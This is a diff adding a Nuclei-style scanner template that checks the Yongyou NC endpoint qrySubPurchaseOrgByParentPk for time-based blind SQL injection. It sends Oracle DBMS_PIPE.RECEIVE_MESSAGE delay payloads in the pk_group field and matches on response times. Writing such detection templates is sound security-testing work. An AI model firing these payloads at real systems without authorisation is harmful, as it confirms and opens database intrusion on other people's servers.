@@ -1,0 +1,30 @@
+id: yongyouNC-qrySubPurchaseOrgByParentPk-sql-time
+
+info:
+  name: yongyouNC-qrySubPurchaseOrgByParentPk-sql-time
+  author: xxx
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4) --
+      - |
+        POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',8) --
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
